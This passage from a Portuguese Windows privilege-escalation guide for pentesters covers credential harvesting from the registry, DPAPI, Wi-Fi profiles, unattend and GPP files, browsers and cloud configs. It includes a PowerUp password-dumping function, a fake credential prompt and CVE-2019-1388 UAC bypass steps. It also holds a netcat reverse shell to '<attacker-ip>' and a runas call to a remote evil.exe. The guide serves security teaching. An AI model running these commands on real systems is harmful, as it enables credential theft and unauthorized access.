```
### Interfaces de Rede & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Portas Abertas

Verifique por **serviços restritos** do lado de fora
```bash
netstat -ano #Opened ports?
```
### Tabela de Roteamento
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### Tabela ARP
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Regras de Firewall

[**Consulte esta página para comandos relacionados ao Firewall**](../basic-cmd-for-pentesters.md#firewall) **(listar regras, criar regras, desativar, desativar...)**

Mais [comandos para enumeração de rede aqui](../basic-cmd-for-pentesters.md#network)

### Subsistema do Windows para Linux (wsl)
```
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
O binário `bash.exe` também pode ser encontrado em `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Se você conseguir o usuário root, você pode escutar em qualquer porta (a primeira vez que você usar `nc.exe` para escutar em uma porta, será perguntado via GUI se o `nc` deve ser permitido pelo firewall).
```
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Para iniciar facilmente o bash como root, você pode tentar `--default-user root`

Você pode explorar o sistema de arquivos do `WSL` na pasta `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Credenciais do Windows

### Credenciais do Winlogon
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Gerenciador de Credenciais / Cofre do Windows

Do [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
O Cofre do Windows armazena credenciais de usuário para servidores, sites e outros programas que o **Windows** pode **fazer login nos usuários automaticamente**. À primeira vista, pode parecer que agora os usuários podem armazenar suas credenciais do Facebook, Twitter, Gmail, etc., para que eles façam login automaticamente através dos navegadores. Mas não é bem assim.

O Cofre do Windows armazena credenciais que o Windows pode usar para fazer login nos usuários automaticamente, o que significa que qualquer **aplicativo Windows que precise de credenciais para acessar um recurso** (servidor ou site) **pode utilizar esse Gerenciador de Credenciais** & Cofre do Windows e usar as credenciais fornecidas em vez de os usuários digitarem o nome de usuário e senha o tempo todo.

A menos que os aplicativos interajam com o Gerenciador de Credenciais, não acho que seja possível para eles usarem as credenciais para um determinado recurso. Portanto, se seu aplicativo deseja fazer uso do cofre, ele deve de alguma forma **comunicar-se com o gerenciador de credenciais e solicitar as credenciais para aquele recurso** do cofre de armazenamento padrão.

Use o `cmdkey` para listar as credenciais armazenadas na máquina.
```
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Então você pode usar `runas` com a opção `/savecred` para utilizar as credenciais salvas. O exemplo a seguir está chamando um binário remoto via um compartilhamento SMB.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Usando `runas` com um conjunto de credenciais fornecido.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
### DPAPI

Em teoria, a Data Protection API pode habilitar a criptografia simétrica de qualquer tipo de dado; na prática, seu uso principal no sistema operacional Windows é realizar a criptografia simétrica de chaves privadas assimétricas, usando um segredo de usuário ou sistema como uma contribuição significativa de entropia.

**O DPAPI permite que desenvolvedores criptografem chaves usando uma chave simétrica derivada dos segredos de logon do usuário**, ou, no caso de criptografia do sistema, usando os segredos de autenticação de domínio do sistema.

As chaves DPAPI usadas para criptografar as chaves RSA do usuário são armazenadas no diretório `%APPDATA%\Microsoft\Protect\{SID}`, onde {SID} é o [Identificador de Segurança](https://en.wikipedia.org/wiki/Security\_Identifier) daquele usuário. **A chave DPAPI é armazenada no mesmo arquivo que a chave mestra que protege as chaves privadas do usuário**. Geralmente, são 64 bytes de dados aleatórios. (Observe que este diretório é protegido, então você não pode listá-lo usando `dir` do cmd, mas pode listá-lo do PS).
```
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Você pode usar o **módulo mimikatz** `dpapi::masterkey` com os argumentos apropriados (`/pvk` ou `/rpc`) para descriptografá-lo.

Os **arquivos de credenciais protegidos pela senha mestra** geralmente estão localizados em:
```
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Você pode usar o **módulo mimikatz** `dpapi::cred` com a `/masterkey` apropriada para descriptografar.\
Você pode **extrair muitas DPAPI** **masterkeys** da **memória** com o módulo `sekurlsa::dpapi` (se você for root).

{% content-ref url="dpapi-extracting-passwords.md" %}
[dpapi-extracting-passwords.md](dpapi-extracting-passwords.md)
{% endcontent-ref %}

### Credenciais do PowerShell

**Credenciais do PowerShell** são frequentemente usadas para **scripting** e tarefas de automação como uma maneira de armazenar credenciais criptografadas de forma conveniente. As credenciais são protegidas usando **DPAPI**, o que tipicamente significa que elas só podem ser descriptografadas pelo mesmo usuário no mesmo computador em que foram criadas.

Para **descriptografar** credenciais do PS a partir do arquivo que as contém, você pode fazer:
```
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Conexões RDP Salvas

Você pode encontrá-las em `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
e em `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Comandos Executados Recentemente
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Gerenciador de Credenciais da Área de Trabalho Remota**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Utilize o módulo **Mimikatz** `dpapi::rdg` com a opção `/masterkey` apropriada para **descriptografar quaisquer arquivos .rdg**\
Você pode **extrair várias masterkeys DPAPI** da memória com o módulo Mimikatz `sekurlsa::dpapi`

### Sticky Notes

As pessoas frequentemente usam o aplicativo StickyNotes no Windows para **salvar senhas** e outras informações, sem perceber que é um arquivo de banco de dados. Este arquivo está localizado em `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` e sempre vale a pena procurar e examinar.

### AppCmd.exe

**Observe que para recuperar senhas do AppCmd.exe você precisa ser Administrador e executar em um nível de Integridade Alto.**\
**AppCmd.exe** está localizado no diretório `%systemroot%\system32\inetsrv\`.\
Se este arquivo existir, então é possível que algumas **credenciais** tenham sido configuradas e possam ser **recuperadas**.

Este código foi extraído de _**PowerUP**_:
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Verifique se `C:\Windows\CCM\SCClient.exe` existe.\
Instaladores são **executados com privilégios de SYSTEM**, muitos são vulneráveis a **DLL Sideloading (Informação de** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Arquivos e Registro (Credenciais)

### Credenciais do Putty
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Chaves de Host SSH do Putty
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### Chaves SSH no registro

Chaves privadas SSH podem ser armazenadas dentro da chave de registro `HKCU\Software\OpenSSH\Agent\Keys`, então você deve verificar se há algo interessante lá:
```
reg query HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys
```
Se você encontrar alguma entrada nesse caminho, provavelmente será uma chave SSH salva. Ela é armazenada criptografada, mas pode ser facilmente descriptografada usando [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Mais informações sobre esta técnica aqui: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Se o serviço `ssh-agent` não estiver em execução e você quiser que ele inicie automaticamente na inicialização, execute:
```
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
{% hint style="info" %}
Parece que esta técnica não é mais válida. Tentei criar algumas chaves ssh, adicioná-las com `ssh-add` e fazer login via ssh em uma máquina. O registro HKCU\Software\OpenSSH\Agent\Keys não existe e o procmon não identificou o uso de `dpapi.dll` durante a autenticação de chave assimétrica.
{% endhint %}

### Arquivos não supervisionados
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Você também pode procurar esses arquivos usando o **metasploit**: _post/windows/gather/enum\_unattend_

Exemplo de conteúdo\_:\_
```markup
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### Backups do SAM & SYSTEM
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Credenciais de Nuvem
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Procure por um arquivo chamado **SiteList.xml**

### Senha GPP em Cache

Antes do KB2928120 (veja MS14-025), algumas Preferências de Política de Grupo poderiam ser configuradas com uma conta personalizada. Essa funcionalidade era principalmente usada para implantar uma conta de administrador local personalizada em um grupo de máquinas. No entanto, havia dois problemas com essa abordagem. Primeiro, uma vez que os Objetos de Política de Grupo são armazenados como arquivos XML em SYSVOL, qualquer usuário do domínio pode lê-los. O segundo problema é que a senha definida nessas GPPs é criptografada com AES256 usando uma chave padrão, que é publicamente documentada. Isso significa que qualquer usuário autenticado poderia potencialmente acessar dados muito sensíveis e elevar seus privilégios em sua máquina ou até mesmo no domínio. Esta função verificará se algum arquivo GPP armazenado localmente contém um campo "cpassword" não vazio. Se sim, ele será descriptografado e retornará um objeto PS personalizado contendo algumas informações sobre o GPP, juntamente com a localização do arquivo.

Procure em `C:\ProgramData\Microsoft\Group Policy\history` ou em _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (anterior ao W Vista)_ por estes arquivos:

* Groups.xml
* Services.xml
* Scheduledtasks.xml
* DataSources.xml
* Printers.xml
* Drives.xml

**Para descriptografar o cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Usando crackmapexec para obter as senhas:
```shell-session
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### Configuração Web do IIS
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Exemplo de web.config com credenciais:
```markup
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### Credenciais do OpenVPN
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Logs
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Peça credenciais

Você sempre pode **pedir ao usuário para inserir suas credenciais ou até mesmo as credenciais de um usuário diferente** se você achar que ele pode conhecê-las (note que **pedir** diretamente ao cliente pelas **credenciais** é realmente **arriscado**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Nomes de arquivos possíveis contendo credenciais**

Arquivos conhecidos que há algum tempo continham **senhas** em **texto claro** ou **Base64**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Pesquise todos os arquivos propostos:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Credenciais na Lixeira

Você também deve verificar a Lixeira para procurar credenciais dentro dela

Para **recuperar senhas** salvas por vários programas, você pode usar: [http://www.nirsoft.net/password\_recovery\_tools.html](http://www.nirsoft.net/password\_recovery\_tools.html)

### Dentro do registro

**Outras possíveis chaves de registro com credenciais**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extraia chaves openssh do registro.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Histórico dos Navegadores

Você deve verificar os bancos de dados onde as senhas do **Chrome ou Firefox** são armazenadas.\
Verifique também o histórico, os favoritos e os bookmarks dos navegadores, pois talvez algumas **senhas estejam** armazenadas lá.

Ferramentas para extrair senhas dos navegadores:

* Mimikatz: `dpapi::chrome`
* [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
* [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
* [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)****

### **Sobrescrita de DLL COM**

**Component Object Model (COM)** é uma tecnologia integrada ao sistema operacional Windows que permite a **intercomunicação** entre componentes de software de diferentes linguagens. Cada componente COM é **identificado por um ID de classe (CLSID)** e cada componente expõe funcionalidades por meio de uma ou mais interfaces, identificadas por IDs de interface (IIDs).

Classes e interfaces COM são definidas no registro em **HKEY\_**_**CLASSES\_**_**ROOT\CLSID** e **HKEY\_**_**CLASSES\_**_**ROOT\Interface** respectivamente. Este registro é criado pela fusão de **HKEY\_**_**LOCAL\_**_**MACHINE\Software\Classes** + **HKEY\_**_**CURRENT\_**_**USER\Software\Classes** = **HKEY\_**_**CLASSES\_**_**ROOT.**

Dentro dos CLSIDs deste registro, você pode encontrar o registro filho **InProcServer32** que contém um **valor padrão** apontando para uma **DLL** e um valor chamado **ThreadingModel** que pode ser **Apartment** (Monothread), **Free** (Multithread), **Both** (Mono ou Multi) ou **Neutral** (Neutro em relação à thread).

![](<../../.gitbook/assets/image (638).png>)

Basicamente, se você puder **sobrescrever qualquer uma das DLLs** que serão executadas, você poderá **escalar privilégios** se essa DLL for executada por um usuário diferente.

Para aprender como os atacantes usam o Hijacking de COM como um mecanismo de persistência, confira:

{% content-ref url="com-hijacking.md" %}
[com-hijacking.md](com-hijacking.md)
{% endcontent-ref %}

### **Busca Genérica de Senhas em Arquivos e Registro**

**Pesquise pelo conteúdo de arquivos**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Busca por um arquivo com um nome de arquivo específico**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Pesquise no registro por nomes de chaves e senhas**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Ferramentas que procuram por senhas

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) é um plugin do msf que criei para **executar automaticamente todos os módulos POST do metasploit que procuram por credenciais** dentro da vítima.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) procura automaticamente por todos os arquivos que contêm senhas mencionadas nesta página.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) é outra ótima ferramenta para extrair senhas de um sistema.

A ferramenta [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) procura por **sessões**, **nomes de usuário** e **senhas** de várias ferramentas que salvam esses dados em texto claro (PuTTY, WinSCP, FileZilla, SuperPuTTY e RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Manipuladores Vazados

Imagine que **um processo rodando como SYSTEM abre um novo processo** (`OpenProcess()`) com **acesso total**. O mesmo processo **também cria um novo processo** (`CreateProcess()`) **com privilégios baixos, mas herdando todos os manipuladores abertos do processo principal**.\
Então, se você tem **acesso total ao processo de baixo privilégio**, você pode pegar o **manipulador aberto para o processo privilegiado criado** com `OpenProcess()` e **injetar um shellcode**.\
[Leia este exemplo para mais informações sobre **como detectar e explorar essa vulnerabilidade**.](leaked-handle-exploitation.md)\
[Leia este **outro post para uma explicação mais completa sobre como testar e abusar de mais manipuladores abertos de processos e threads herdados com diferentes níveis de permissões (não apenas acesso total)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Impersonação de Cliente de Named Pipe

Um `pipe` é um bloco de memória compartilhada que processos podem usar para comunicação e troca de dados.

`Named Pipes` é um mecanismo do Windows que permite que dois processos não relacionados troquem dados entre si, mesmo que os processos estejam localizados em duas redes diferentes. É muito semelhante à arquitetura cliente/servidor, pois existem noções como `um servidor de named pipe` e um `cliente de named pipe`.

Quando um **cliente escreve em um pipe**, o **servidor** que criou o pipe pode **impersonar** o **cliente** se tiver privilégios de **SeImpersonate**. Então, se você encontrar um **processo privilegiado que vai escrever em qualquer pipe que você possa impersonar**, você poderia ser capaz de **escalar privilégios** impersonando esse processo após ele escrever dentro do seu pipe criado. [**Você pode ler isto para aprender como realizar este ataque**](named-pipe-client-impersonation.md) **ou** [**isto**](./#from-high-integrity-to-system)**.**

**Além disso, a seguinte ferramenta permite interceptar uma comunicação de named pipe com uma ferramenta como o burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **e esta ferramenta permite listar e ver todos os pipes para encontrar privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)****

## Diversos

### **Monitorando Linhas de Comando para senhas**

Ao obter um shell como usuário, pode haver tarefas agendadas ou outros processos sendo executados que **passam credenciais na linha de comando**. O script abaixo captura linhas de comando de processos a cada dois segundos e compara o estado atual com o estado anterior, exibindo quaisquer diferenças.
```powershell
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## De Usuário com Privilégios Baixos para NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Se você tem acesso à interface gráfica (via console ou RDP) e o UAC está ativado, em algumas versões do Microsoft Windows é possível executar um terminal ou qualquer outro processo como "NT\AUTHORITY SYSTEM" a partir de um usuário não privilegiado.

Isso torna possível escalar privilégios e burlar o UAC ao mesmo tempo com a mesma vulnerabilidade. Além disso, não é necessário instalar nada e o binário utilizado durante o processo é assinado e emitido pela Microsoft.

Alguns dos sistemas afetados são os seguintes:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Para explorar essa vulnerabilidade, é necessário realizar os seguintes passos:

```
1) Clique com o botão direito no arquivo HHUPD.EXE e execute-o como Administrador.

2) Quando o prompt do UAC aparecer, selecione "Mostrar mais detalhes".

3) Clique em "Mostrar informações do certificado do publicador".

4) Se o sistema estiver vulnerável, ao clicar no link da URL "Emitido por", o navegador web padrão pode ser aberto.

5) Aguarde o site carregar completamente e selecione "Salvar como" para abrir uma janela do explorer.exe.

6) No caminho do endereço da janela do explorer, insira cmd.exe, powershell.exe ou qualquer outro processo interativo.

7) Agora você terá um prompt de comando "NT\AUTHORITY SYSTEM".

8) Lembre-se de cancelar a configuração e o prompt do UAC para retornar à sua área de trabalho.
```

Você tem todos os arquivos e informações necessários no seguinte repositório do GitHub:

https://github.com/jas502n/CVE-2019-1388

## De Administrador Nível Médio para Alto Nível de Integridade / Bypass do UAC

Leia isto para **aprender sobre Níveis de Integridade**:

{% content-ref url="integrity-levels.md" %}
[integrity-levels.md](integrity-levels.md)
{% endcontent-ref %}

Em seguida, **leia isto para aprender sobre o UAC e bypasses do UAC:**

{% content-ref url="../windows-security-controls/uac-user-account-control.md" %}
